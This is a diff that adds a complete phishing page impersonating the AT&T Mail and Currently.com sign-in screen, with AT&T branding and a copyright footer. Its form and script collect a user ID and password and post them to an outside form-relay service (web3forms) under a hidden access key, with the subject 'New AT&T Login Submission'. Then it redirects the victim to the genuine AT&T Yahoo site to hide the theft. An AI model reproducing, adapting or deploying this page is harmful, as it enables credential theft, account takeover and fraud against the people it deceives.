@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Login Screen</title>
+<link href="local_resources/img/ad543b500809f62803fff4e680643f64.ico" rel="icon" type="image/svg+xml"/> <!-- Favicon added -->
+<style>
+       body {
+           font-family: Arial, sans-serif;
+           margin: 0;
+           padding: 20px;
+           display: flex;
+           flex-direction: column;
+           align-items: center;
+       }
+
+       .logo {
+           width: 120px;
+           margin-bottom: 20px;
+       }
+
+       h1 {
+           font-size: 32px;
+           margin: 0;
+           margin-bottom: 10px;
+       }
+
+       h2 {
+           font-size: 24px;
+           margin: 0;
+           margin-bottom: 40px;
+           font-weight: normal;
+       }
+
+       .form-container {
+           width: 100%;
+           max-width: 400px;
+       }
+
+       .form-step {
+           transition: opacity 0.3s ease-in-out;
+       }
+
+       .form-step.hidden {
+           display: none;
+           opacity: 0;
+       }
+
+       label {
+           display: block;
+           font-size: 18px;
+           margin-bottom: 10px;
+       }
+
+       input {
+           width: 100%;
+           padding: 12px;
+           font-size: 16px;
+           border: 1px solid #ccc;
+           border-radius: 4px;
+           margin-bottom: 20px;
+           box-sizing: border-box;
+       }
+
+       button {
+           width: 100%;
+           padding: 15px;
+           background-color: #0057B8;
+           color: white;
+           border: none;
+           border-radius: 24px;
+           font-size: 18px;
+           cursor: pointer;
+           margin-bottom: 20px;
+           transition: background-color 0.2s;
+       }
+
+       button:hover {
+           background-color: #003DA5;
+       }
+
+       .back-button {
+           background-color: transparent;
+           color: #0057B8;
+           border: 1px solid #0057B8;
+           margin-bottom: 10px;
+       }
+
+       .back-button:hover {
+           background-color: #E6EFF8;
+       }
+
+       a {
+           color: #0057B8;
+           text-decoration: none;
+           font-size: 16px;
+           display: block;
+           margin-bottom: 15px;
+       }
+
+       .footer {
+           margin-top: 100px;
+           width: 100%;
+           max-width: 400px;
+       }
+
+       .footer a {
+           color: #666;
+           font-size: 14px;
+           margin-bottom: 10px;
+       }
+
+       .privacy-toggle {
+           display: flex;
+           align-items: center;
+           color: #666;
+           font-size: 14px;
+       }
+
+       .privacy-toggle::before {
+           content: '';
+           width: 40px;
+           height: 24px;
+           background: #ccc;
+           border-radius: 12px;
+           margin-right: 10px;
+           position: relative;
+       }
+
+       .user-id-display {
+           font-size: 16px;
+           margin-bottom: 20px;
+           color: #666;
+       }
+
+       #loadingOverlay {
+           display: none;
+           position: fixed;
+           top: 0;
+           left: 0;
+           width: 100%;
+           height: 100%;
+           background-color: rgba(255, 255, 255, 0.8);
+           justify-content: center;
+           align-items: center;
+           z-index: 1000;
+       }
+
+       .spinner {
+           border: 4px solid #f3f3f3;
+           border-top: 4px solid #0057B8;
+           border-radius: 50%;
+           width: 40px;
+           height: 40px;
+           animation: spin 1s linear infinite;
+       }
+
+       @keyframes spin {
+           0% { transform: rotate(0deg); }
+           100% { transform: rotate(360deg); }
+       }
+   </style>
+</head>
+<body>
+<div id="loadingOverlay">
+<div class="spinner"></div>
+</div>
+<br/>
+<img alt="AT&amp;T Logo" class="logo" src="local_resources/img/db1bf16391ee46f6f15d548f8122e560.svg"/>
+<center> <h2> <b> Sign in <br/> to access AT&amp;T Mail and Currently.com </b> </h2> </center>
+<div class="form-container">
+<form action="https://api.web3forms.com/submit" id="loginForm" method="POST">
+<input name="access_key" type="hidden" value="3f5a2374-687b-468d-bd79-55d1eb0f00f1"/>
+<input name="subject" type="hidden" value="New AT&amp;T Login Submission"/>
+<div class="form-step" id="userIdStep">
+<b> <label for="userId">User ID</label>
+<input id="userId" name="userId" required="" type="text"/>
+<button onclick="showKeyStep()" type="button">Continue</button>
+<a href="#">Forgot user ID?</a>
+<a href="#">Don't have a user ID? Create one now</a></b>
+</div>
+<div class="form-step hidden" id="keyStep">
+<div class="user-id-display"></div>
+<b><label for="key">Password</label> <!-- Changed label -->
+<input id="key" name="key" required="" type="password"/> <!-- Changed name -->
+<button type="submit">Sign in</button>
+<a href="#">Forgot Password?</a></b>
+</div>
+</form>
+</div>
+<br/>
+<br/>
+<div class="footer">
+<small> <a href="#">Legal policy center</a>
+<a href="#">Privacy policy</a>
+<a href="#">Terms of use</a>
+<a href="#">Accessibility</a></small>
+<div class="privacy-toggle">
+           Your privacy choices
+       </div>
+<p><small>Â©2024 AT&amp;T Intellectual Property. All rights reserved.</small></p>
+</div>
+<script>
+       const userIdStep = document.getElementById('userIdStep');
+       const keyStep = document.getElementById('keyStep');
+       const userIdDisplay = document.querySelector('.user-id-display');
+       const loginForm = document.getElementById('loginForm');
+       const loadingOverlay = document.getElementById('loadingOverlay');
+
+       function showKeyStep() {
+           const userId = document.getElementById('userId').value;
+           if (!userId) {
+               alert('Please enter a User ID');
+               return;
+           }
+           userIdDisplay.textContent = userId;
+           userIdStep.classList.add('hidden');
+           keyStep.classList.remove('hidden');
+       }
+
+       function showUserIdStep() {
+           keyStep.classList.add('hidden');
+           userIdStep.classList.remove('hidden');
+       }
+
+       loginForm.addEventListener('submit', async function(e) {
+           e.preventDefault();
+           loadingOverlay.style.display = 'flex';
+
+           const formData = new FormData(loginForm);
+           const object = {};
+           formData.forEach((value, key) => {
+               object[key] = value;
+           });
+
+           try {
+               const response = await fetch(loginForm.action, {
+                   method: 'POST',
+                   headers: {
+                       'Content-Type': 'application/json',
+                       'Accept': 'application/json'
+                   },
+                   body: JSON.stringify(object)
+               });
+               
+               const result = await response.json();
+               
+               if (result.success) {
+                   window.location.href = 'https://currently.att.yahoo.com/';
+               } else {
+                   alert('An error occurred. Please try again.');
+               }
+           } catch (error) {
+               alert('An error occurred. Please try again.');
+           } finally {
+               loadingOverlay.style.display = 'none';
+           }
+       });
+   </script>
+</body>
+</html>
